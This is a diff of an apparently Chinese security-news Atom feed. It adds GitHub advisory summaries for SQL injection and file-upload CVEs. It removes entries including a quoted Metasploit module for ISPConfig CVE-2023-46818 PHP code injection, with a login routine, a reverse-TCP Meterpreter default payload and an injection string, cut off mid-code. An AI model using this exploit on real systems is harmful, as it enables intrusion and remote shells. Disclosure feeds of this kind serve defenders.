@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-27T17:45:12.252Z</updated>
+  <updated>2025-06-27T19:00:11.781Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,150 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
+    <link href="http://example.com/2025/06/27/github_2624342796/"/>
+    <id>http://example.com/2025/06/27/github_2624342796/</id>
+    <published>2025-06-27T19:00:11.787Z</published>
+    <updated>2025-06-27T19:00:11.781Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-px3q-xqpv-v524">https://github.com/advisories/GHSA-px3q-xqpv-v524</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-11739">https://nvd.nist.gov/vuln/detail/CVE-2024-11739</a></p></li><li><p><a href="https://www.usom.gov.tr/bildirim/tr-25-0139">https://www.usom.gov.tr/bildirim/tr-25-0139</a></p></li><li><p><a href="https://github.com/advisories/GHSA-px3q-xqpv-v524">https://github.com/advisories/GHSA-px3q-xqpv-v524</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in Case Informatics Case ERP allows SQL Injection.This issue affects Case ERP: before V2.0.1.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-px3q-xqpv-v524&quot;&gt;https://github.com/advisories/GHSA-px3q-xqpv-v524&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
+    <link href="http://example.com/2025/06/27/github_26397558/"/>
+    <id>http://example.com/2025/06/27/github_26397558/</id>
+    <published>2025-06-27T19:00:10.348Z</published>
+    <updated>2025-06-27T19:00:10.345Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-q3cr-crgf-v8f7">https://github.com/advisories/GHSA-q3cr-crgf-v8f7</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12143">https://nvd.nist.gov/vuln/detail/CVE-2024-12143</a></p></li><li><p><a href="https://www.usom.gov.tr/bildirim/tr-25-0142">https://www.usom.gov.tr/bildirim/tr-25-0142</a></p></li><li><p><a href="https://github.com/advisories/GHSA-q3cr-crgf-v8f7">https://github.com/advisories/GHSA-q3cr-crgf-v8f7</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in Mobilteg Mobile Informatics Mikro Hand Terminal - MikroDB allows SQL Injection.This issue affects . NOTE: The vendor did not inform about the completion of the fixing process within the specified time. The CVE will be updated when new information becomes available.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-q3cr-crgf-v8f7&quot;&gt;https://github.com/advisories/GHSA-q3cr-crgf-v8f7&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
+    <link href="http://example.com/2025/06/27/github_3311690420/"/>
+    <id>http://example.com/2025/06/27/github_3311690420/</id>
+    <published>2025-06-27T19:00:09.057Z</published>
+    <updated>2025-06-27T19:00:09.053Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-6pf2-7rpc-938x">https://github.com/advisories/GHSA-6pf2-7rpc-938x</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12150">https://nvd.nist.gov/vuln/detail/CVE-2024-12150</a></p></li><li><p><a href="https://www.usom.gov.tr/bildirim/tr-25-0141">https://www.usom.gov.tr/bildirim/tr-25-0141</a></p></li><li><p><a href="https://github.com/advisories/GHSA-6pf2-7rpc-938x">https://github.com/advisories/GHSA-6pf2-7rpc-938x</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in Eron Software Wowwo CRM allows Blind SQL Injection.This issue affects . NOTE: The vendor did not inform about the completion of the fixing process within the specified time. The CVE will be updated when new information becomes available.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-6pf2-7rpc-938x&quot;&gt;https://github.com/advisories/GHSA-6pf2-7rpc-938x&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PBXCoreREST/Controllers/Files/PostControllerphp in MikoPBX through 20241114 allows uploading a</title>
+    <link href="http://example.com/2025/06/27/github_1993624407/"/>
+    <id>http://example.com/2025/06/27/github_1993624407/</id>
+    <published>2025-06-27T19:00:07.654Z</published>
+    <updated>2025-06-27T19:00:07.648Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-6578-p64m-wjxr">https://github.com/advisories/GHSA-6578-p64m-wjxr</a></p><p><strong>CVSS 评分：</strong> 9.9</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52207">https://nvd.nist.gov/vuln/detail/CVE-2025-52207</a></p></li><li><p><a href="https://github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3">https://github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3</a></p></li><li><p><a href="https://www.mikopbx.com/">https://www.mikopbx.com</a></p></li><li><p><a href="https://github.com/advisories/GHSA-6578-p64m-wjxr">https://github.com/advisories/GHSA-6578-p64m-wjxr</a></p></li></ul><p><strong>描述：</strong></p><p>PBXCoreREST&#x2F;Controllers&#x2F;Files&#x2F;PostController.php in MikoPBX through 2024.1.114 allows uploading a PHP script to an arbitrary directory.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-6578-p64m-wjxr&quot;&gt;https://github.com/advisories/GHSA-6578-p64m-wjxr&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</title>
+    <link href="http://example.com/2025/06/27/github_2606901038/"/>
+    <id>http://example.com/2025/06/27/github_2606901038/</id>
+    <published>2025-06-27T19:00:06.377Z</published>
+    <updated>2025-06-27T19:00:06.372Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-48fx-2j4w-wmpx">https://github.com/advisories/GHSA-48fx-2j4w-wmpx</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12364">https://nvd.nist.gov/vuln/detail/CVE-2024-12364</a></p></li><li><p><a href="https://www.usom.gov.tr/bildirim/tr-25-0140">https://www.usom.gov.tr/bildirim/tr-25-0140</a></p></li><li><p><a href="https://github.com/advisories/GHSA-48fx-2j4w-wmpx">https://github.com/advisories/GHSA-48fx-2j4w-wmpx</a></p></li></ul><p><strong>描述：</strong></p><p>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in Mavi Yeşil Software Guest Tracking Software allows SQL Injection.This issue affects .  NOTE: The vendor did not inform about the completion of the fixing process within the specified time. The CVE will be updated when new information becomes available.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-48fx-2j4w-wmpx&quot;&gt;https://github.com/advisories/GHSA-48fx-2j4w-wmpx&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Dover Fueling Solutions ProGauge MagLink LX Consoles expose an undocumented and unauthenticated</title>
+    <link href="http://example.com/2025/06/27/github_54867767/"/>
+    <id>http://example.com/2025/06/27/github_54867767/</id>
+    <published>2025-06-27T19:00:04.802Z</published>
+    <updated>2025-06-27T19:00:04.796Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-gp8x-529h-7cmw">https://github.com/advisories/GHSA-gp8x-529h-7cmw</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5310">https://nvd.nist.gov/vuln/detail/CVE-2025-5310</a></p></li><li><p><a href="https://github.com/advisories/GHSA-gp8x-529h-7cmw">https://github.com/advisories/GHSA-gp8x-529h-7cmw</a></p></li></ul><p><strong>描述：</strong></p><p>Dover Fueling Solutions ProGauge MagLink LX Consoles expose an undocumented and unauthenticated target communication framework (TCF) interface on a specific port. Files can be created, deleted, or modified, potentially leading to remote code execution.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-gp8x-529h-7cmw&quot;&gt;https://github.com/advisories/GHSA-gp8x-529h-7cmw&lt;/a&gt;&lt;/p</summary>
+      
+    
+    
+    
+    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
+    
+    
+    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2024-3094-analysis</title>
@@ -355,156 +499,6 @@
       
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-5vj6-wjr7-5v9f&quot;&gt;https://github.com/advisories/GHSA-5vj6-wjr7-5v9f&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Github Poc</title>
-    <link href="http://example.com/2025/06/27/github_1015208117/"/>
-    <id>http://example.com/2025/06/27/github_1015208117/</id>
-    <published>2025-06-27T14:15:10.325Z</published>
-    <updated>2025-06-27T14:15:10.323Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-27388</li></ul><p><strong>来源：</strong> <a href="https://github.com/Mahesh-970/CVE-2024-27388_afterpatch">https://github.com/Mahesh-970/CVE-2024-27388_afterpatch</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.whitesource</li><li>gss_rpc_xdr.c</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/06/27/twitter_1837605125/"/>
-    <id>http://example.com/2025/06/27/twitter_1837605125/</id>
-    <published>2025-06-27T14:00:29.783Z</published>
-    <updated>2025-06-27T14:00:29.779Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络和安全数据，揭示宝贵见解。课程内容包括数据准备、特征工程、探索性数据分析、数据可视化、机器学习、模型评估以及大规模实施，全部聚焦于安全相关的问题。立即注册&gt;&gt; <a href="https://t.co/UTq7Zlc057">https://t.co/UTq7Zlc057</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1938588376422056154">https://x.com/BlackHatEvents/status/1938588376422056154</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 加入#BlackHat秋季培训课程“应用数据科学与人工智能于网络安全（在线）”。这门为期两天的互动课程教授安全专业人士如何利用数据科学技术分析网络</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ISPConfig language_editphp PHP代码注入</title>
-    <link href="http://example.com/2025/06/27/github_457305466/"/>
-    <id>http://example.com/2025/06/27/github_457305466/</id>
-    <published>2025-06-27T13:45:26.208Z</published>
-    <updated>2025-06-27T13:45:26.204Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ISPConfig language_edit.php PHP代码注入</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-46818</li></ul><p><strong>漏洞类型：</strong> 代码注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ISPConfig在3.2.11p1之前的版本中，语言文件编辑器存在PHP代码注入漏洞。当admin_allow_langedit启用时，管理员可以利用此漏洞注入PHP代码。</p><p><strong>产品厂商：</strong> ISPConfig</p><p><strong>产品名称：</strong> ISPConfig</p><p><strong>影响版本：</strong> version &lt; 3.2.11p1</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb">https://github.com/rapid7/metasploit-framework/blob/016f4ea14207f629f77d100747034c7319924f03/modules%2Fexploits%2Flinux%2Fhttp%2Fispconfig_lang_edit_php_code_injection.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  prepend Msf::Exploit::Remote::AutoCheck<br>  include Msf::Exploit::Remote::HttpClient<br>  include Msf::Exploit::FileDropper<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;ISPConfig language_edit.php PHP Code Injection&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          An issue was discovered <span class="hljs-keyword">in</span> ISPConfig before <span class="hljs-number">3.2</span>.<span class="hljs-number">11p</span>1. PHP code injection can be achieved <span class="hljs-keyword">in</span> the language file editor <span class="hljs-keyword">by</span> an admin <span class="hljs-keyword">if</span> admin_allow_langedit <span class="hljs-keyword">is</span> enabled.<br>        &#125;,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;syfi&#x27;</span> <span class="hljs-comment"># Discovery and PoC</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span 